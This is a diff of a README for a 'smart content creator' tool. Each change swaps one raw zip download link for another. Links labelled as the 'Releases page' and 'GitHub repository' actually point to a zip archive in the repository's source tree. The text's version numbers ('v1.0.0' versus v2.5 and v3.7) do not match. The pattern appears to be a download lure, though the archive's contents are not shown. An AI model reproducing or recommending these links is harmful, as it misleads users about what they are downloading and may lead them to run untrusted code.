@@ -1,6 +1,6 @@
 # 🌟 smart-content-creator-skill - Transform Ideas into Engaging Content
 
-[![Download](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip)](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip)
+[![Download](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-skill-creator-content-v2.5.zip)](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-skill-creator-content-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the latest version of the software. Follow 
 
 1. Click the button below to visit the Releases page.
    
-   [Download from Releases](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip)
+   [Download from Releases](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-skill-creator-content-v2.5.zip)
 
 2. On the Releases page, look for the version titled "v1.0.0".
 
@@ -77,7 +77,7 @@ For additional support and tips on using the Smart Content Creator Skill, explor
 
 ## 🔗 Additional Links
 
-- Visit the [Releases page](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip) for all versions of the software.
-- Check our [GitHub repository](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-content-creator-skill_v3.7.zip) for updates and contributions.
+- Visit the [Releases page](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-skill-creator-content-v2.5.zip) for all versions of the software.
+- Check our [GitHub repository](https://raw.githubusercontent.com/Caroline-bedfordcord721/smart-content-creator-skill/main/src/smart-content-creator/smart-skill-creator-content-v2.5.zip) for updates and contributions.
 
 By following this guide, you should be well on your way to creating impressive content with the Smart Content Creator Skill. Enjoy the process of expressing your thoughts and insights!
